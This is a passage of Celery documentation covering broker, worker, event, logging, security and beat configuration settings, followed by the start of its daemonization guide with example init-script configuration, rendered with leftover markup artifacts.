broker_login_method``broker\_login\_method`~~~~~~~~~~~~~~~~~~~~~~~  Default:`"AMQPLAIN"`.  Set custom amqp login method.  .. setting:: broker_native_delayed_delivery_queue_type`broker\_native\_delayed\_delivery\_queue\_type`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.5  :transports supported:`pyamqp`Default:`"quorum"`.  This setting is used to allow changing the default queue type for the native delayed delivery queues. The other viable option is`"classic"`which is only supported by RabbitMQ and sets the queue type to`classic`using the`x-queue-type`queue argument.  .. setting:: broker_transport_options`broker\_transport\_options`~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 2.2  Default:`{}`(empty mapping).  A dict of additional options passed to the underlying transport.  See your transport user manual for supported options (if any).  Example setting the visibility timeout (supported by Redis and SQS transports):`\`python broker\_transport\_options = {'visibility\_timeout': 18000} \# 5 hours

Example setting the producer connection maximum number of retries (so producers `` ` won't retry forever if the broker isn't available at the first task execution): ``\`python broker\_transport\_options = {'max\_retries': 5}

<div id="conf-worker">

Worker `` ` ------  .. setting:: imports ``imports`~~~~~~~~~~~  Default:`\[\]`(empty list).  A sequence of modules to import when the worker starts.  This is used to specify the task modules to import, but also to import signal handlers and additional remote control commands, etc.  The modules will be imported in the original order.  .. setting:: include`include`~~~~~~~~~~~  Default:`\[\]``(empty list).  Exact same semantics as :setting:`imports`, but can be used as a means to have different import categories.  The modules in this setting are imported after the modules in :setting:`imports`.  .. setting:: worker_deduplicate_successful_tasks``worker\_deduplicate\_successful\_tasks`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.1  Default: False  Before each task execution, instruct the worker to check if this task is a duplicate message.  Deduplication occurs only with tasks that have the same identifier, enabled late acknowledgment, were redelivered by the message broker and their state is`SUCCESS``in the result backend.  To avoid overflowing the result backend with queries, a local cache of successfully executed tasks is checked before querying the result backend in case the task was already successfully executed by the same worker that received the task.  This cache can be made persistent by setting the :setting:`worker_state_db` setting.  If the result backend is not `persistent <https://github.com/celery/celery/blob/main/celery/backends/base.py#L102>`_ (the RPC backend, for example), this setting is ignored.  .. _conf-concurrency:  .. setting:: worker_concurrency``worker\_concurrency`~~~~~~~~~~~~~~~~~~~~~~  Default: Number of CPU cores.  The number of concurrent worker processes/threads/green threads executing tasks.  If you're doing mostly I/O you can have more processes, but if mostly CPU-bound, try to keep it close to the number of CPUs on your machine. If not set, the number of CPUs/cores on the host will be used.  .. setting:: worker_prefetch_multiplier`worker\_prefetch\_multiplier``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 4.  How many messages to prefetch at a time multiplied by the number of concurrent processes. The default is 4 (four messages for each process). The default setting is usually a good choice, however -- if you have very long running tasks waiting in the queue and you have to start the workers, note that the first worker to start will receive four times the number of messages initially. Thus the tasks may not be fairly distributed to the workers.  To disable prefetching, set :setting:`worker_prefetch_multiplier` to 1. Changing that setting to 0 will allow the worker to keep consuming as many messages as it wants.  For more on prefetching, read [optimizing-prefetch-limit](#optimizing-prefetch-limit)  > **Note** >      Tasks with ETA/countdown aren't affected by prefetch limits.  .. setting:: worker_enable_prefetch_count_reduction``worker\_enable\_prefetch\_count\_reduction`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: Enabled.  The`worker\_enable\_prefetch\_count\_reduction``setting governs the restoration behavior of the prefetch count to its maximum allowable value following a connection loss to the message broker. By default, this setting is enabled.  Upon a connection loss, Celery will attempt to reconnect to the broker automatically, provided the :setting:`broker_connection_retry_on_startup` or :setting:`broker_connection_retry` is not set to False. During the period of lost connection, the message broker does not keep track of the number of tasks already fetched. Therefore, to manage the task load effectively and prevent overloading, Celery reduces the prefetch count based on the number of tasks that are currently running.  The prefetch count is the number of messages that a worker will fetch from the broker at a time. The reduced prefetch count helps ensure that tasks are not fetched excessively during periods of reconnection.  With``worker\_enable\_prefetch\_count\_reduction`set to its default value (Enabled), the prefetch count will be gradually restored to its maximum allowed value each time a task that was running before the connection was lost is completed. This behavior helps maintain a balanced distribution of tasks among the workers while managing the load effectively.  To disable the reduction and restoration of the prefetch count to its maximum allowed value on reconnection, set`worker\_enable\_prefetch\_count\_reduction`to False. Disabling this setting might be useful in scenarios where a fixed prefetch count is desired to control the rate of task processing or manage the worker load, especially in environments with fluctuating connectivity.  The`worker\_enable\_prefetch\_count\_reduction`setting provides a way to control the restoration behavior of the prefetch count following a connection loss, aiding in maintaining a balanced task distribution and effective load management across the workers.  .. setting:: worker_lost_wait`worker\_lost\_wait``~~~~~~~~~~~~~~~~~~~~  Default: 10.0 seconds.  In some cases a worker may be killed without proper cleanup, and the worker may have published a result before terminating. This value specifies how long we wait for any missing results before raising a `@WorkerLostError` exception.  .. setting:: worker_max_tasks_per_child``worker\_max\_tasks\_per\_child`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Maximum number of tasks a pool worker process can execute before it's replaced with a new one. Default is no limit.  .. setting:: worker_max_memory_per_child`worker\_max\_memory\_per\_child`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: No limit. Type: int (kilobytes)  Maximum amount of resident memory, in kilobytes, that may be consumed by a worker before it will be replaced by a new worker. If a single task causes a worker to exceed this limit, the task will be completed, and the worker will be replaced afterwards.  Example:`\`python worker\_max\_memory\_per\_child = 12000 \# 12MB

</div>

<div class="setting">

worker\_disable\_rate\_limits

</div>

`worker_disable_rate_limits` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Disabled (rate limits enabled).  Disable all rate limits, even if tasks has explicit rate limits set.  .. setting:: worker_state_db ``worker\_state\_db``~~~~~~~~~~~~~~~~~~~  Default: `None`.  Name of the file used to stores persistent worker state (like revoked tasks). Can be a relative or absolute path, but be aware that the suffix `.db` may be appended to the file name (depending on Python version).  Can also be set via the :option:`celery worker --statedb` argument.  .. setting:: worker_timer_precision``worker\_timer\_precision`~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 1.0 seconds.  Set the maximum time in seconds that the ETA scheduler can sleep between rechecking the schedule.  Setting this value to 1 second means the schedulers precision will be 1 second. If you need near millisecond precision you can set this to 0.1.  .. setting:: worker_enable_remote_control`worker\_enable\_remote\_control`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Enabled by default.  Specify if remote control of the workers is enabled.  .. setting:: worker_proc_alive_timeout`worker\_proc\_alive\_timeout`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 4.0.  The timeout in seconds (int/float) when waiting for a new worker process to start up.  .. setting:: worker_cancel_long_running_tasks_on_connection_loss`worker\_cancel\_long\_running\_tasks\_on\_connection\_loss``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.1  Default: Disabled by default.  Kill all long-running tasks with late acknowledgment enabled on connection loss.  Tasks which have not been acknowledged before the connection loss cannot do so anymore since their channel is gone and the task is redelivered back to the queue. This is why tasks with late acknowledged enabled must be idempotent as they may be executed more than once. In this case, the task is being executed twice per connection loss (and sometimes in parallel in other workers).  When turning this option on, those tasks which have not been completed are cancelled and their execution is terminated. Tasks which have completed in any way before the connection loss are recorded as such in the result backend as long as :setting:`task_ignore_result` is not enabled.  > **Warning** >      This feature was introduced as a future breaking change.     If it is turned off, Celery will emit a warning message.      In Celery 6.0, the :setting:`worker_cancel_long_running_tasks_on_connection_loss`     will be set to``True`by default as the current behavior leads to more     problems than it solves.  .. setting:: worker_detect_quorum_queues`worker\_detect\_quorum\_queues``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.5  Default: Enabled.  Automatically detect if any of the queues in :setting:`task_queues` are quorum queues (including the :setting:`task_default_queue`) and disable the global QoS if any quorum queue is detected.  .. setting:: worker_soft_shutdown_timeout``worker\_soft\_shutdown\_timeout``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.5  Default: 0.0.  The standard [warm shutdown <worker-warm-shutdown>](#warm-shutdown-<worker-warm-shutdown>) will wait for all tasks to finish before shutting down unless the cold shutdown is triggered. The [soft shutdown <worker-soft-shutdown>](#soft-shutdown-<worker-soft-shutdown>) will add a waiting time before the cold shutdown is initiated. This setting specifies how long the worker will wait before the cold shutdown is initiated and the worker is terminated.  This will apply also when the worker initiate [cold shutdown <worker-cold-shutdown>](#cold-shutdown-<worker-cold-shutdown>) without doing a warm shutdown first.  If the value is set to 0.0, the soft shutdown will be practically disabled. Regardless of the value, the soft shutdown will be disabled if there are no tasks running (unless :setting:`worker_enable_soft_shutdown_on_idle` is enabled).  Experiment with this value to find the optimal time for your tasks to finish gracefully before the worker is terminated. Recommended values can be 10, 30, 60 seconds. Too high value can lead to a long waiting time before the worker is terminated and trigger a :sig:`KILL` signal to forcefully terminate the worker by the host system.  .. setting:: worker_enable_soft_shutdown_on_idle``worker\_enable\_soft\_shutdown\_on\_idle``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.5  Default: False.  If the :setting:`worker_soft_shutdown_timeout` is set to a value greater than 0.0, the worker will skip the [soft shutdown <worker-soft-shutdown>](#soft-shutdown-<worker-soft-shutdown>) anyways if there are no tasks running. This setting will enable the soft shutdown even if there are no tasks running.  > **Tip** >      When the worker received ETA tasks, but the ETA has not been reached yet, and a shutdown is initiated,     the worker will **skip** the soft shutdown and initiate the cold shutdown immediately if there are no     tasks running. This may lead to failure in re-queueing the ETA tasks during worker teardown. To mitigate     this, enable this configuration to ensure the worker waits regadless, which gives enough time for a     graceful shutdown and successful re-queueing of the ETA tasks.  .. _conf-events:  Events ------  .. setting:: worker_send_task_events``worker\_send\_task\_events``~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Disabled by default.  Send task-related events so that tasks can be monitored using tools like `flower`. Sets the default value for the workers :option:`-E <celery worker -E>` argument.  .. setting:: task_send_sent_event``task\_send\_sent\_event``~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 2.2  Default: Disabled by default.  If enabled, a :event:`task-sent` event will be sent for every task so tasks can be tracked before they're consumed by a worker.  .. setting:: event_queue_ttl``event\_queue\_ttl`~~~~~~~~~~~~~~~~~~~ :transports supported:`amqp`Default: 5.0 seconds.  Message expiry time in seconds (int/float) for when messages sent to a monitor clients event queue is deleted (`x-message-ttl`)  For example, if this value is set to 10 then a message delivered to this queue will be deleted after 10 seconds.  .. setting:: event_queue_expires`event\_queue\_expires`~~~~~~~~~~~~~~~~~~~~~~~ :transports supported:`amqp`Default: 60.0 seconds.  Expiry time in seconds (int/float) for when after a monitor clients event queue will be deleted (`x-expires`).  .. setting:: event_queue_prefix`event\_queue\_prefix`~~~~~~~~~~~~~~~~~~~~~~  Default:`"celeryev"`.  The prefix to use for event receiver queue names.  .. setting:: event_exchange`event\_exchange`~~~~~~~~~~~~~~~~~~~~~~  Default:`"celeryev"`.  Name of the event exchange.  > **Warning** >      This option is in experimental stage, please use it with caution.  .. setting:: event_serializer`event\_serializer`~~~~~~~~~~~~~~~~~~~~  Default:`"json"`.  Message serialization format used when sending event messages.  .. seealso::      [calling-serializers](#calling-serializers).   .. setting:: events_logfile`events\_logfile``~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional file path for :program:`celery events` to log into (defaults to `stdout`).  .. setting:: events_pidfile``events\_pidfile``~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional file path for :program:`celery events` to create/store its PID file (default to no PID file created).  .. setting:: events_uid``events\_uid``~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional user ID to use when events :program:`celery events` drops its privileges (defaults to no UID change).  .. setting:: events_gid``events\_gid``~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional group ID to use when :program:`celery events` daemon drops its privileges (defaults to no GID change).  .. setting:: events_umask``events\_umask``~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional `umask` to use when :program:`celery events` creates files (log, pid...) when daemonizing.  .. setting:: events_executable``events\_executable``~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional `python` executable path for :program:`celery events` to use when deaemonizing (defaults to `sys.executable`).   .. _conf-control:  Remote Control Commands -----------------------  > **Note** >      To disable remote control commands see     the :setting:`worker_enable_remote_control` setting.  .. setting:: control_queue_ttl``control\_queue\_ttl`~~~~~~~~~~~~~~~~~~~~~  Default: 300.0  Time in seconds, before a message in a remote control command queue will expire.  If using the default of 300 seconds, this means that if a remote control command is sent and no worker picks it up within 300 seconds, the command is discarded.  This setting also applies to remote control reply queues.  .. setting:: control_queue_expires`control\_queue\_expires`~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 10.0  Time in seconds, before an unused remote control command queue is deleted from the broker.  This setting also applies to remote control reply queues.  .. setting:: control_exchange`control\_exchange`~~~~~~~~~~~~~~~~~~~~~~  Default:`"celery"`.  Name of the control command exchange.  > **Warning** >      This option is in experimental stage, please use it with caution.  .. _conf-logging:  Logging -------  .. setting:: worker_hijack_root_logger`worker\_hijack\_root\_logger``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 2.2  Default: Enabled by default (hijack root logger).  By default any previously configured handlers on the root logger will be removed. If you want to customize your own logging handlers, then you can disable this behavior by setting `worker_hijack_root_logger = False`.  > **Note** >      Logging can also be customized by connecting to the     :signal:`celery.signals.setup_logging` signal.  .. setting:: worker_log_color``worker\_log\_color`~~~~~~~~~~~~~~~~~~~~  Default: Enabled if app is logging to a terminal.  Enables/disables colors in logging output by the Celery apps.  .. setting:: worker_log_format`worker\_log\_format`~~~~~~~~~~~~~~~~~~~~~  Default:`\`text "\[%(asctime)s: %(levelname)s/%(processName)s\] %(message)s"

The format to use for log messages.

See the Python `logging` module for more information about log `` ` formats.  .. setting:: worker_task_log_format ``worker\_task\_log\_format`~~~~~~~~~~~~~~~~~~~~~~~~~~  Default:`\`text "\[%(asctime)s: %(levelname)s/%(processName)s\] %(task\_name)s\[%(task\_id)s\]: %(message)s"

The format to use for log messages logged in tasks.

See the Python `logging` module for more information about log `` ` formats.  .. setting:: worker_redirect_stdouts ``worker\_redirect\_stdouts``~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Enabled by default.  If enabled `stdout` and `stderr` will be redirected to the current logger.  Used by :program:`celery worker` and :program:`celery beat`.  .. setting:: worker_redirect_stdouts_level``worker\_redirect\_stdouts\_level``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: `WARNING`.  The log level output to `stdout` and `stderr` is logged as. Can be one of `DEBUG`, `INFO`, `WARNING`, `ERROR`, or `CRITICAL`.  .. _conf-security:  Security --------  .. setting:: security_key``security\_key``~~~~~~~~~~~~~~~~  Default: `None`.  .. versionadded:: 2.5  The relative or absolute path to a file containing the private key used to sign messages when [message-signing](#message-signing) is used.  .. setting:: security_key_password``security\_key\_password``~~~~~~~~~~~~~~~~~~~~~~~~~  Default: `None`.  .. versionadded:: 5.3.0  The password used to decrypt the private key when [message-signing](#message-signing) is used.  .. setting:: security_certificate``security\_certificate``~~~~~~~~~~~~~~~~~~~~~~~~  Default: `None`.  .. versionadded:: 2.5  The relative or absolute path to an X.509 certificate file used to sign messages when [message-signing](#message-signing) is used.  .. setting:: security_cert_store``security\_cert\_store``~~~~~~~~~~~~~~~~~~~~~~~  Default: `None`.  .. versionadded:: 2.5  The directory containing X.509 certificates used for [message-signing](#message-signing). Can be a glob with wild-cards, (for example :file:`/etc/certs/*.pem`).  .. setting:: security_digest``security\_digest``~~~~~~~~~~~~~~~~~~~~~~~~  Default: `sha256`.  .. versionadded:: 4.3  A cryptography digest used to sign messages when [message-signing](#message-signing) is used. https://cryptography.io/en/latest/hazmat/primitives/cryptographic-hashes/#module-cryptography.hazmat.primitives.hashes  .. _conf-custom-components:  Custom Component Classes (advanced) -----------------------------------  .. setting:: worker_pool``worker\_pool`~~~~~~~~~~~~~~~  Default:`"prefork"`(`celery.concurrency.prefork:TaskPool``).  Name of the pool class used by the worker.  .. admonition:: Eventlet/Gevent      Never use this option to select the eventlet or gevent pool.     You must use the :option:`-P <celery worker -P>` option to     :program:`celery worker` instead, to ensure the monkey patches     aren't applied too late, causing things to break in strange ways.  .. setting:: worker_pool_restarts``worker\_pool\_restarts``~~~~~~~~~~~~~~~~~~~~~~~~  Default: Disabled by default.  If enabled the worker pool can be restarted using the :control:`pool_restart` remote control command.  .. setting:: worker_autoscaler``worker\_autoscaler`~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 2.2  Default:`"celery.worker.autoscale:Autoscaler"`.  Name of the autoscaler class to use.  .. setting:: worker_consumer`worker\_consumer`~~~~~~~~~~~~~~~~~~~  Default:`"celery.worker.consumer:Consumer"`.  Name of the consumer class used by the worker.  .. setting:: worker_timer`worker\_timer`~~~~~~~~~~~~~~~~  Default:`"kombu.asynchronous.hub.timer:Timer"`.  Name of the ETA scheduler class used by the worker. Default is or set by the pool implementation.  .. setting:: worker_logfile`worker\_logfile``~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional file path for :program:`celery worker` to log into (defaults to `stdout`).  .. setting:: worker_pidfile``worker\_pidfile``~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional file path for :program:`celery worker` to create/store its PID file (defaults to no PID file created).  .. setting:: worker_uid``worker\_uid``~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional user ID to use when :program:`celery worker` daemon drops its privileges (defaults to no UID change).  .. setting:: worker_gid``worker\_gid``~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional group ID to use when :program:`celery worker` daemon drops its privileges (defaults to no GID change).  .. setting:: worker_umask``worker\_umask``~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional `umask` to use when :program:`celery worker` creates files (log, pid...) when daemonizing.  .. setting:: worker_executable``worker\_executable``~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional `python` executable path for :program:`celery worker` to use when deaemonizing (defaults to `sys.executable`).  .. _conf-celerybeat:  Beat Settings (:program:`celery beat`) --------------------------------------  .. setting:: beat_schedule``beat\_schedule`~~~~~~~~~~~~~~~~~  Default:`{}``(empty mapping).  The periodic task schedule used by :mod:`~celery.bin.beat`. See [beat-entries](#beat-entries).  .. setting:: beat_scheduler``beat\_scheduler`~~~~~~~~~~~~~~~~~~  Default:`"celery.beat:PersistentScheduler"`.  The default scheduler class. May be set to`"django\_celery\_beat.schedulers:DatabaseScheduler"``for instance, if used alongside :pypi:`django-celery-beat` extension.  Can also be set via the :option:`celery beat -S` argument.  .. setting:: beat_schedule_filename``beat\_schedule\_filename`~~~~~~~~~~~~~~~~~~~~~~~~~~  Default:`"celerybeat-schedule"``.  Name of the file used by `PersistentScheduler` to store the last run times of periodic tasks. Can be a relative or absolute path, but be aware that the suffix `.db` may be appended to the file name (depending on Python version).  Can also be set via the :option:`celery beat --schedule` argument.  .. setting:: beat_sync_every``beat\_sync\_every`~~~~~~~~~~~~~~~~~~~  Default: 0.  The number of periodic tasks that can be called before another database sync is issued. A value of 0 (default) means sync based on timing - default of 3 minutes as determined by scheduler.sync_every. If set to 1, beat will call sync after every task message sent.  .. setting:: beat_max_loop_interval`beat\_max\_loop\_interval``~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 0.  The maximum number of seconds :mod:`~celery.bin.beat` can sleep between checking the schedule.  The default for this value is scheduler specific. For the default Celery beat scheduler the value is 300 (5 minutes), but for the :pypi:`django-celery-beat` database scheduler it's 5 seconds because the schedule may be changed externally, and so it must take changes to the schedule into account.  Also when running Celery beat embedded (:option:`-B <celery worker -B>`) on Jython as a thread the max interval is overridden and set to 1 so that it's possible to shut down in a timely manner.  .. setting:: beat_cron_starting_deadline``beat\_cron\_starting\_deadline``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.3  Default: None.  When using cron, the number of seconds :mod:`~celery.bin.beat` can look back when deciding whether a cron schedule is due. When set to `None`, cronjobs that are past due will always run immediately.  .. setting:: beat_logfile``beat\_logfile``~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional file path for :program:`celery beat` to log into (defaults to `stdout`).  .. setting:: beat_pidfile``beat\_pidfile``~~~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional file path for :program:`celery beat` to create/store it PID file (defaults to no PID file created).  .. setting:: beat_uid``beat\_uid``~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional user ID to use when beat :program:`celery beat` drops its privileges (defaults to no UID change).  .. setting:: beat_gid``beat\_gid``~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional group ID to use when :program:`celery beat` daemon drops its privileges (defaults to no GID change).  .. setting:: beat_umask``beat\_umask``~~~~~~~~~~~~~~  .. versionadded:: 5.4  Default: `None`  An optional `umask` to use when :program:`celery beat` creates files (log, pid...) when daemonizing.  .. setting:: beat_executable``beat\_executable\`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

<div class="versionadded">

5.4

</div>

Default: <span class="title-ref">None</span>

An optional <span class="title-ref">python</span> executable path for `celery beat` to use when deaemonizing (defaults to <span class="title-ref">sys.executable</span>).

---

daemonizing.md

---

# Daemonization

<div class="contents" data-local="">

</div>

Most Linux distributions these days use systemd for managing the lifecycle of system and user services.

You can check if your Linux distribution uses systemd by typing:

`` `console     $ systemctl --version     systemd 249 (v249.9-1.fc35)     +PAM +AUDIT +SELINUX -APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 +PWQUALITY +P11KIT +QRENCODE +BZIP2 +LZ4 +XZ +ZLIB +ZSTD +XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified  If you have output similar to the above, please refer to ``\` \[our systemd documentation \<daemon-systemd-generic\>\](\#our-systemd-documentation-\<daemon-systemd-generic\>) for guidance.

However, the init.d script should still work in those Linux distributions as well since systemd provides the systemd-sysv compatibility layer which generates services automatically from the init.d scripts we provide.

If you package Celery for multiple Linux distributions and some do not support systemd or to other Unix systems as well, you may want to refer to \[our init.d documentation \<daemon-generic\>\](\#our-init.d-documentation-\<daemon-generic\>).

## Generic init-scripts

See the [extra/generic-init.d/](https://github.com/celery/celery/tree/main/extra/generic-init.d/) directory Celery distribution.

This directory contains generic bash init-scripts for the `celery worker` program, these should run on Linux, FreeBSD, OpenBSD, and other Unix-like platforms.

### Init-script: `celeryd`

  - Usage  
    <span class="title-ref">/etc/init.d/celeryd {start|stop|restart|status}</span>

  - Configuration file  
    `/etc/default/celeryd`

To configure this script to run the worker properly you probably need to at least tell it where to change directory to when it starts (to find the module containing your app, or your configuration module).

The daemonization script is configured by the file `/etc/default/celeryd`. This is a shell (`sh`) script where you can add environment variables like the configuration options below. To add real environment variables affecting the worker you must also export them (e.g., `export DISPLAY=":0"`)

<div class="admonition">

Superuser privileges required

The init-scripts can only be used by root, and the shell configuration file must also be owned by root.

Unprivileged users don't need to use the init-script, instead they can use the `celery multi` utility (or `celery worker --detach`):

  - \`\`\`console  
    $ celery -A proj multi start worker1 --pidfile="$HOME/run/celery/%n.pid" --logfile="$HOME/log/celery/%n%I.log"
    
    $ celery -A proj multi restart worker1 --logfile="$HOME/log/celery/%n%I.log" --pidfile="$HOME/run/celery/%n.pid
    
    $ celery multi stopwait worker1 --pidfile="$HOME/run/celery/%n.pid"

</div>

<div id="generic-initd-celeryd-example">

Example configuration `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  This is an example configuration for a Python project.  :file:`/etc/default/celeryd`: ``\`bash \# Names of nodes to start \# most people will only start one node: CELERYD\_NODES="worker1" \# but you can also start multiple and configure settings \# for each in CELERYD\_OPTS \#CELERYD\_NODES="worker1 worker2 worker3" \# alternatively, you can specify the number of nodes to start: \#CELERYD\_NODES=10

</div>

> \# Absolute or relative path to the 'celery' command: CELERY\_BIN="/usr/local/bin/celery" \#CELERY\_BIN="/virtualenvs/def/bin/celery"
> 
> \# App instance to use \# comment out this line if you don't use an app CELERY\_APP="proj" \# or fully qualified: \#CELERY\_APP="proj.tasks:app"
> 
> \# Where to chdir at start. CELERYD\_CHDIR="/opt/Myproject/"
> 
> \# Extra command-line arguments to the worker CELERYD\_OPTS="--time-limit=300 --concurrency=8" \# Configure node-specific settings by appending node name to arguments: \#CELERYD\_OPTS="--time-limit=300 -c 8 -c:worker2 4 -c:worker3 2 -Ofair:worker1"
> 
> \# Set logging level to DEBUG \#CELERYD\_LOG\_LEVEL="DEBUG"
> 
> \# %n will be replaced with the first part of the nodename. CELERYD\_LOG\_FILE="/var/log/celery/%n%I.log" CELERYD\_PID\_FILE="/var/run/celery/%n.pid"
> 
> \# Workers should run as an unprivileged user. \# You need to create this user manually (or you can choose \# a user/group combination that already exists (e.g., nobody). CELERYD\_USER="celery" CELERYD\_GROUP="celery"
> 
> \# If enabled pid and log directories will be created if missing, \# and owned by the userid/group configured. CELERY\_CREATE\_DIRS=1

Using a login shell `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  You can inherit the environment of the ``CELERYD\_USER`by using a login shell:`\`bash CELERYD\_SU\_ARGS="-l"

Note that this isn't recommended, and that you should only use this option `` ` when absolutely necessary.  .. _generic-initd-celeryd-django-example:  Example Django configuration ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Django users now uses the exact same template as above, but make sure that the module that defines your Celery app instance also sets a default value for :envvar:`DJANGO_SETTINGS_MODULE` as shown in the example Django project in [django-first-steps](#django-first-steps).  .. _generic-initd-celeryd-options:  Available options ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  * ``CELERY\_APP``App instance to use (value for :option:`--app <celery --app>` argument).  *``CELERY\_BIN``Absolute or relative path to the :program:`celery` program.     Examples:          * :file:`celery`         * :file:`/usr/local/bin/celery`         * :file:`/virtualenvs/proj/bin/celery`         * :file:`/virtualenvs/proj/bin/python -m celery`  *``CELERYD\_NODES`List of node names to start (separated by space).  *`CELERYD\_OPTS``Additional command-line arguments for the worker, see     `celery worker --help` for a list. This also supports the extended     syntax used by `multi` to configure settings for individual nodes.     See `celery multi --help` for some multi-node configuration examples.  *``CELERYD\_CHDIR`Path to change directory to at start. Default is to stay in the current     directory.  *`CELERYD\_PID\_FILE`Full path to the PID file. Default is /var/run/celery/%n.pid  *`CELERYD\_LOG\_FILE``Full path to the worker log file. Default is /var/log/celery/%n%I.log     **Note**: Using `%I` is important when using the prefork pool as having     multiple processes share the same log file will lead to race conditions.  *``CELERYD\_LOG\_LEVEL`Worker log level. Default is INFO.  *`CELERYD\_USER`User to run the worker as. Default is current user.  *`CELERYD\_GROUP`Group to run worker as. Default is current user.  *`CELERY\_CREATE\_DIRS`Always create directories (log directory and pid file directory).     Default is to only create directories when no custom logfile/pidfile set.  *`CELERY\_CREATE\_RUNDIR`Always create pidfile directory. By default only enabled when no custom     pidfile location set.  *`CELERY\_CREATE\_LOGDIR`Always create logfile directory. By default only enable when no custom     logfile location set.  .. _generic-initd-celerybeat:  Init-script:`celerybeat``---------------------------------------------------------------------- :Usage: `/etc/init.d/celerybeat {start|stop|restart}` :Configuration file: :file:`/etc/default/celerybeat` or                      :file:`/etc/default/celeryd`.  .. _generic-initd-celerybeat-example:  Example configuration ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  This is an example configuration for a Python project:  `/etc/default/celerybeat`:``\`bash \# Absolute or relative path to the 'celery' command: CELERY\_BIN="/usr/local/bin/celery" \#CELERY\_BIN="/virtualenvs/def/bin/celery"

> \# App instance to use \# comment out this line if you don't use an app CELERY\_APP="proj" \# or fully qualified: \#CELERY\_APP="proj.tasks:app"
> 
> \# Where to chdir at start. CELERYBEAT\_CHDIR="/opt/Myproject/"
> 
> \# Extra arguments to celerybeat CELERYBEAT\_OPTS="--schedule=/var/run/celery/celerybeat-schedule"

<div id="generic-initd-celerybeat-django-example">

Example Django configuration `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  You should use the same template as above, but make sure the ``DJANGO\_SETTINGS\_MODULE`variable is set (and exported), and that`CELERYD\_CHDIR`is set to the projects directory:`\`bash export DJANGO\_SETTINGS\_MODULE="settings"

</div>

